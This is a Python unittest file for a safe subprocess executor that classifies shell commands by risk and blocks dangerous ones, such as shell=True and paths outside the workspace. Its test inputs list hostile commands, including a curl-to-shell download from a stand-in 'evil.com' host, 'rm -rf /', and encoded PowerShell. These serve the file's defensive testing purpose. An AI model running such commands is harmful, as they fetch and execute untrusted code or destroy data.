"""Tests for safe_run.py — Central safe subprocess executor."""
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import unittest
import tempfile
from pathlib import Path

from safe_run import classify_command, safe_run, Risk


# Cross-platform safe command for testing
_SAFE_CMD = [sys.executable, "-c", "import sys; sys.stdout.write('hello_test\\n')"]


class TestSafeRunClassification(unittest.TestCase):
    """Test command classification accuracy."""

    def test_powershell_encoded_blocked(self) -> None:
        r = classify_command("powershell -EncodedCommand SGVsbG8=")
        self.assertEqual(r.risk, Risk.BLOCKED)
        self.assertTrue(r.blocked)

    def test_rm_rf_root_blocked(self) -> None:
        r = classify_command("rm -rf /")
        self.assertEqual(r.risk, Risk.BLOCKED)
        self.assertTrue(r.blocked)

    def test_python_c_detected_high(self) -> None:
        r = classify_command('python -c "import os"')
        self.assertGreaterEqual(r.risk, Risk.HIGH)

    def test_bash_c_detected_high(self) -> None:
        r = classify_command('bash -c "echo pwned"')
        self.assertGreaterEqual(r.risk, Risk.HIGH)

    def test_curl_pipe_sh_high(self) -> None:
        r = classify_command("curl https://evil.com/x.sh | sh")
        self.assertGreaterEqual(r.risk, Risk.HIGH)

    def test_docker_prune_high(self) -> None:
        r = classify_command("docker system prune -af")
        self.assertGreaterEqual(r.risk, Risk.HIGH)

    def test_rm_rf_high(self) -> None:
        r = classify_command("rm -rf /tmp/test")
        self.assertGreaterEqual(r.risk, Risk.HIGH)

    def test_git_clean_high(self) -> None:
        r = classify_command("git clean -fdx")
        self.assertGreaterEqual(r.risk, Risk.HIGH)

    def test_case_insensitive_detection(self) -> None:
        """Uppercase variants must still be detected."""
        r = classify_command("RM -RF /tmp/test")
        self.assertGreaterEqual(r.risk, Risk.HIGH,
                                f"Expected HIGH for RM -RF, got {r.risk_label}")
        r2 = classify_command("DOCKER SYSTEM PRUNE -AF")
        self.assertGreaterEqual(r2.risk, Risk.HIGH,
                                f"Expected HIGH for DOCKER SYSTEM PRUNE, got {r2.risk_label}")

    def test_git_status_safe(self) -> None:
        r = classify_command("git status")
        self.assertEqual(r.risk, Risk.SAFE)

    def test_ls_safe(self) -> None:
        r = classify_command("ls -la")
        self.assertEqual(r.risk, Risk.SAFE)

    def test_unknown_command_medium(self) -> None:
        r = classify_command("some_random_tool --flag")
        self.assertGreaterEqual(r.risk, Risk.MEDIUM)


class TestSafeRunExecution(unittest.TestCase):
    """Test safe_run() execution blocking."""

    def test_blocked_command_refused(self) -> None:
        result = safe_run(
            ["powershell", "-EncodedCommand", "SGVsbG8="],
            risk_level="high",
            approval_required=False,
        )
        self.assertTrue(result.blocked)

    def test_shell_interpreter_refused(self) -> None:
        result = safe_run(
            ["python", "-c", "print(1+1)"],
            risk_level="medium",
            approval_required=False,
        )
        self.assertTrue(result.blocked)

    def test_dangerous_kwargs_rejected(self) -> None:
        """shell=True and other dangerous kwargs must be rejected."""
        result = safe_run(
            ["echo", "test"],
            risk_level="low",
            approval_required=False,
            shell=True,  # should be rejected
        )
        self.assertTrue(result.blocked)
        self.assertIn("shell", result.block_reason.lower())

    def test_safe_command_executes(self) -> None:
        result = safe_run(
            _SAFE_CMD,
            risk_level="medium",  # python -c is unknown → medium
            approval_required=False,
        )
        self.assertFalse(result.blocked,
                         f"blocked={result.blocked}, reason={result.block_reason}")
        self.assertIn("hello_test", result.stdout)

    def test_cwd_outside_workspace_blocked(self) -> None:
        """cwd outside workspace must be blocked."""
        with tempfile.TemporaryDirectory() as ws:
            outside_dir = tempfile.gettempdir()
            result = safe_run(
                _SAFE_CMD,
                workspace=ws,
                cwd=outside_dir,
                risk_level="low",
                approval_required=False,
            )
            self.assertTrue(result.blocked,
                            f"Expected blocked, got blocked={result.blocked}")

    def test_path_outside_workspace_resolved_blocked(self) -> None:
        """Relative paths resolved against cwd must be checked."""
        with tempfile.TemporaryDirectory() as ws:
            outside_file = str(Path(tempfile.gettempdir()) / "outside.txt")
            result = safe_run(
                ["ls", outside_file],
                workspace=ws,
                risk_level="medium",
                approval_required=False,
            )
            self.assertTrue(result.blocked,
                            f"Expected blocked for outside path, got {result.blocked}")

    def test_workspace_containment_allows(self) -> None:
        with tempfile.TemporaryDirectory() as ws:
            result = safe_run(
                _SAFE_CMD,
                workspace=ws,
                risk_level="medium",
                approval_required=False,
            )
            self.assertFalse(result.blocked,
                             f"blocked={result.blocked}, reason={result.block_reason}")


if __name__ == "__main__":
    unittest.main()
